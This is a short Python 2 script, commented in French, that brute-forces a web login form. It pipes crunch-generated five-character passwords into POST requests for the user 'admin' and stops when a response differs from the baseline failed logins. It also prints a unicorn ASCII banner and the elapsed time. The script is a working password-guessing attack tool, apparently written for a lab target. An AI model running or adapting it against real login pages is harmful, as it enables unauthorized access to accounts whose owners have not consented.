#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import sys
import os
import subprocess
import datetime
#exemple : http://10.0.2.15/secret.php
#(la page du traitement php)
#choix de la method (post ou get) par default post



#si post url du traitement html form avec injection data


def myRequest (myURL):
    #creating comparative request
    blank_payload = {'username':'admin', 'passwd':'s'}
    s = requests.post(myURL, data=blank_payload)
    second_blank = {'username':'admin', 'passwd':'aaaaa'}
    t = requests.post(myURL, data = second_blank)
    #opening pipe
    proc = subprocess.Popen(["crunch 5 5 azertyuiopqsdfghjklmwxcvbn1230456789"], stdout=subprocess.PIPE, shell=True)

    while True:
        line = proc.stdout.readline()
        payload = {'username': 'admin', 'passwd': line.rstrip() }
        r = requests.post(myURL, data=payload)

#find a good if for unavailable request and bad passwd

        if(r.text == t.text):
            r = requests.post(myURL, data = payload)
        
        if (r.text != t.text and s.text != r.text):
            print(payload)
            break

        
#use a good managing for the entries


#main fonction
if __name__ == '__main__':
    if len(sys.argv) > 1:
        timer = datetime.datetime.now()
        timer.strftime("%Y-%m-%d %H:%M")
        
        try:
            #the unicorn :)
            print(' .:-.\n  `-//:.` \n   `-////-`       /.    `....`::::::-.` \n      ./////-:/-.`/oo+/++++++//++++++++/-`\n         `://///++++oosoo++++++++++++++++++- `.\n         `-//////++oosoooooooooo++++++++++:`//.\n          `..-///++ooooooooooooooooooo+++++++::++:\n         .://+oooooooooooooooooooooooo+++++//+++:\n            .ooooooooooooooooooooooooooo+++++++++\n            +ooooooyyoooooooooooooooooooo++++++++\n           -ooooooohhsoooooooooooooooooooo+++++++\n            /ooooooooooooooooooooooooooooooo++++++\n            ooooooooooooooooooooooooooooooooo+++++\n           .oooooooooooooooooooooooooooooooooo++++\n           /ooooooooooooooooo+oooooooooooooooo++++\n          :ooooooooooooooooo+`+oooooooooooooooo+++\n         :ooooooooooooooooo/` .ooooooooooooooooo++\n        .ooooooooooooo+/:-`    /ooooooooooooooooo+\n        /ossoooooooo+-         -oooooooooooooooooo\n        -osoooooooo+`          `oooooooooooooooooo\n         .+ooooooo/`           `oooooooooooooooooo\n           `-:::-`             `oooooooooooooooooo\n                               .oooooooooooooooooo\n                               .oooooooooooooooooo\n                               -oooooooooooooooooo\n')
            myRequest (sys.argv[1])
            now = datetime.datetime.now()
            timeless = datetime.datetime.now()-timer
            print 'temps ecoule : ', str(timeless)
            
        except(KeyboardInterrupt):
            now = datetime.datetime.now()
            timeless = datetime.datetime.now()-timer
            print 'temps ecoule : ', str(timeless)
            
    else:
        sys.stdout.write("invalid URL or wordlist \r")
